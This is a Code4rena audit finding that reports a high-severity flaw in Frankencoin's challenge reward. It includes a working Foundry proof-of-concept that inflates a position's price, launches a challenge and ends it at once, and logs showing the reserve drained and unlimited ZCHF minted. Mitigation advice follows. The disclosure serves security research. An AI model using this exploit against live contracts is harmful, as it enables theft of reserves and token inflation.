---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/lending
protocol: "[[Frankencoin]]"
auditors:
  - "[[Emmanuel]]"
report: "https://code4rena.com/reports/2023-04-frankencoin"
genome:
  - "[[reward-calculation]]"
  - "[[direct-drain]]"
  - "[[liquidation-underwater]]"
  - "[[reward-accounting]]"
---
# [H-06] `CHALLENGER_REWARD` can be used to drain reserves and free mint

- id: 20021
- impact: HIGH
- protocol: [[Frankencoin]]
- reporter: Emmanuel (Code4rena)
- source: https://code4rena.com/reports/2023-04-frankencoin

## Summary


This bug report is about a vulnerability in the auction mechanism of Frankencoin (ZCHF), a cryptocurrency system. If the challenge is successful, the bidder gets the collateral from the position and the position is closed, distributing excess proceeds to the reserve and paying a reward to the challenger. The reward for the challenger is based on the user provided price and can be abused to have the protocol pay unlimited rewards.

By setting the price to a very large value, the reward for the challenger will be large too. This can be done when creating a position, or by adjusting the price later with an adjustPrice call. The challenge can then be started and the end() function can be called, resulting in the challenger receiving a high amount of ZCHF as a fee.

A proof of concept testscript was created to demonstrate the vulnerability. The results of the test showed that the hacker received a large amount of ZCHF as a reward.

To mitigate this vulnerability, it is recommended to restrict the moments when challenges can be started, and to limit the amount by which the price can be changed.

## Details


The goal of the auction mechanism is to determine the fair price of the collateral, so that Frankencoin (ZCHF) is always sufficiently backed and the system remains in balance.

If the challenge is successful, the bidder gets the collateral from the position and the position is closed, distributing excess proceeds to the reserve and paying a reward to the challenger.

The reward for the challenger is based on the user provided price and can be abused to have the protocol pay unlimited rewards.

### Proof of Concept

When a challenge ends without being Averted, the [end()](https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L252) function can be called to process the liquidation.
This process pays back the minted `ZCHF` tokens with the bid and sends the collateral to the bidder. The challenger receives back the collateral he supplied when starting the challenge, and receives a `CHALLENGER_REWARD` of 2% of the challenged collateral value in `ZCHF`.

To calculate the value of the reward, it uses
[uint256 reward = (volume &ast; CHALLENGER_REWARD) / 1000\_000;](https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L265) with `volume` being the `volumeZCHF` value returned from [Position.notifyChallengeSucceeded()](https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L329)\
This is calculated as\
`uint256 volumeZCHF = _mulD18(price, _size);`<br>
`// How much could have minted with the challenged amount of the collateral`<br>
meaning that if the price is very high, the theoretical volumeZCHF  will be very high too.

When there are insufficient funds in the Position to pay for the reward, `FrankenCoin.notifyLoss()` is used to get the funds from the reserve and mint new coins.

The price of a Position can be set when it is created, or later by the owner via an adjustPrice call.<br>
The steps to take:

1.  Position owner mints the maximum ZCHF.
2.  Position owner adjusts price and sets it to a very large value.
3.  Owner immediately starts a challenge via MintingHub
    When price is very high, if there are bids, they will never pass the AvertChallenge check of `_bidAmountZCHF * ONE_DEC18 >= price * _collateralAmount` so the Challenge will always succeed.
4. After the challenge period, the end()  function can be called, and Challenger will receive a high amount of ZCHF as a fee.

An alternative and faster way is to create a new position and immediately challenge it.

When creating a Position, `_challengeSeconds` can be set to 0 and calling `launchChallenge` is possible before Position start waiting time is over. This makes it possible for any user to drain all reserves and mint a large number of ZCHF in 1 transaction.

**POC Script**

A proof of concept testscript is created to demonstrate the vulnerability.
This code was added to `GeneralTest.t.sol`

```solidity
    function showBalances() public {
        address hacker = 0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01;
        console.log('================ Balances ================');
        console.log('hacker xchf     :',xchf.balanceOf(hacker)/1e18);
        console.log('hacker zchf     :',zchf.balanceOf(hacker)/1e18);
        console.log('reserver zchf   :',zchf.balanceOf(address(zchf.reserve()))/1e18);
        console.log('zchf.totalSupply:',zchf.totalSupply()/1e18);
        console.log(' ');
    }

    function test10AbuseChallengeReward() public {

        test04Mint(); // let bob/alice open position so not all is empty 

        // init, start wit 2 xchf and 1000 zhf
        address hacker = 0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01;
        TestToken xchf_ = TestToken(address(swap.chf()));
        xchf_.mint(address(hacker), 1002 ether);

        vm.startPrank(hacker);
        xchf_.approve(address(swap),  1000 ether);
        swap.mint(1000 ether);
        showBalances(); 

        // open a position with fake inflated price and dummy collateral. 
        // _challengeSeconds to 0 so we can immediately challenge and end
        xchf_.approve(address(hub),  1 ether); // collateral
        zchf.approve(address(hub),  1000 ether); // 1000 OPENING_FEE
        address myPosition = hub.openPosition(
            address(xchf_), // _collateralAddress,
            1 ether,        // _minCollateral
            1 ether,        // _initialCollateral
            1000 ether,     // _mintingMaximum
            3 days,         // _initPeriodSeconds minimum perios
            10 days,        // _expirationSeconds
            0,              // _challengeSeconds set to 0 to immediately challenge and end 
            0,              //_mintingFeePPM, 
            type(uint256).max / 1e20,  // _liqPrice - huge inflated price
            0               // _reservePPM
        );
        console.log('Creates our Position with inflated price, 1000 opening fee to reserves 1 xchf as collateral');
        showBalances();

        console.log('Start launchChallenge and immediately end the auction.');
        console.log('We will receive the 1 xchf collateral back');
        console.log('and 2% of inflated collateral price in zchf as CHALLENGER_REWARD');
        console.log('zchf is first taken all from reserve, and rest minted');
        xchf_.approve(address(hub),  1 ether); // collateral
        uint256 challengeID = hub.launchChallenge(myPosition, 1 ether);
        hub.end(challengeID);
        showBalances(); 
        vm.stopPrank();

    }
```

The results of the test

    [PASS] test10AbuseChallengeReward() (gas: 3939346)
    Logs:
      ================ Balances ================
      hacker xchf     : 2
      hacker zchf     : 1000
      reserver zchf   : 23500
      zchf.totalSupply: 102000

      We have creates our Position with inflated price
      ================ Balances ================
      hacker xchf     : 1
      hacker zchf     : 0
      reserver zchf   : 24500
      zchf.totalSupply: 102000

      Start launchChallenge and immediately end the auction.
      We will receive the 1 xchf collateral back
      and 2% of inflated collateral price in zchf as CHALLENGER_REWARD
      zchf is first taken all from reserve, and rest minted
      ================ Balances ================
      hacker xchf     : 2
      hacker zchf     : 23158417847463239084714197001737581570
      reserver zchf   : 0
      zchf.totalSupply: 23158417847463239084714197001737659070

### Tools Used

Manual review, forge

### Recommended Mitigation Steps

It would be recommeded to restrict the moments when challenges can be started so Positions cannot be challenged before start time and when they are denied.
This will make challenges only possible when a position once was valid, with a valid price.

To prevent owners to change the price of their Position to an extremenly large value, it can be limited to change the price max x% per adjustment.

**[luziusmeisser (Frankencoin) confirmed and commented](https://github.com/code-423n4/2023-04-frankencoin-findings/issues/458#issuecomment-1529099536):**
 > This is probably the most important issue revealed during the audit. The warden deserves a big reward for this!

***
